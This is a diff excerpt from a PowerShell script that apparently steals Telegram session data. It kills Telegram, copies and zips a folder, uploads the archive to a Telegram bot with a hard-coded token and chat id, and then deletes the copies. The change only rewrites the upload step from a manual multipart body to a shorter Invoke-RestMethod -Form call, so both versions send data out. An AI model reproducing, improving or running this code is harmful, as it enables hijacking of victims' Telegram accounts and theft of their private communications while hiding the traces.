@@ -8,7 +8,5 @@ if(Get-Process Telegram -ErrorAction SilentlyContinue){Stop-Process -Name Telegr
 New-Item $t -ItemType Directory -Force|Out-Null
 Copy-Item "$s\*" $t -Recurse -Force
 Compress-Archive "$t\*" $z -Force
-$boundary="----Boundary$(Get-Random)"
-$body=("--$boundary`r`nContent-Disposition: form-data; name=`"chat_id`"`r`n`r`n$c`r`n--$boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $z -Leaf)`"`r`nContent-Type: application/octet-stream`r`n`r`n$([System.IO.File]::ReadAllBytes($z)|%{[char]$_})$([char]13)$([char]10)--$boundary--")
-Invoke-RestMethod "https://api.telegram.org/bot$b/sendDocument" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
+Invoke-RestMethod "https://api.telegram.org/bot$b/sendDocument" -Method Post -ContentType "multipart/form-data" -Form @{chat_id=$c;document=Get-Item $z}
 Remove-Item $t,$z -Recurse -Force -ErrorAction SilentlyContinue
